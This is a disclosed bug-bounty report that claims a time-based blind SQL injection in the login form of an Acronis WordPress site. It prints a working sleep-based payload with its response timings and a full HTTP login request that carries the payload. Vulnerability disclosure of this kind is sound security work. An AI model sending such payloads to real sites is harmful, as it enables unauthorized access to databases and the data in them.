# bypass sql injection #1109311

## Report Details
- **Report ID**: 1224660
- **URL**: https://hackerone.com/reports/1224660
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-12T04:15:02.478Z
- **Disclosed**: 2021-10-05T09:19:07.984Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
hello dear support

i have found SQL injection and bypass this case #1109311

Tests performed:

    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
    0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
Proof
=======

{F1335267}

payload in photos
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

http request
=============

POST /wp-login.php HTTP/2
Host: www.acronis.cz
Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; _fbp=fb.1.1623467463578.959472854; wordpress_test_cookie=WP+Cookie+check
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.acronis.cz/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 717
Origin: https://www.acronis.cz
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z+%3D%3E&g-recaptcha-response=03AGdBq25b-W6tugq-xMA5r4HA1FJJX1uDMve_1fZXKK0wtp2SxW745D7MwrwsXYpIQtRFHR4cMPxIWp5nTWRR89A4LGaom7kVvG7eMiPGe2z-rQIAM9oAd2Anp5_RBkg9tTndCyHlFh1cMUZKTtq-eF1yEI_Ixi7c6-xkDrqvs0Kb5DEZ_eu9SWNnm_evtbW0XXtz8pI7ipHNzw5icYUn6LmxkbxmyqfyQ5j4ZaPGnoPvtS2huSZKyN9RoVBL-v9UHs8Zdkj1dcVvVwurhVCNjBBFPTnZeA-D1iYSp_kqtfLzW1d84F_-9p09Tw9bp7qlirNa-UFSKnWxY27c6oAw5_p649TgBzLQMY4-bMK0_2bbqOv1RIy2vhqIXjpeh6r8l4-MAHHgllF0iW2ClpXKn5Y95DSg2muoc-zzdQ5xE2cpLL3Gw71nNITafbIC2QEKyyS-QBk8h1dn&wp-submit=P%C5%99ihl%C3%A1sit+se&redirect_to=https%3A%2F%2Fwww.acronis.cz%2Fwp-admin%2F&testcookie=1

sleep 10 it's response millis 12000 

Vulnerability Description


SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server.

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## Attachments
- 6666666666666.PNG
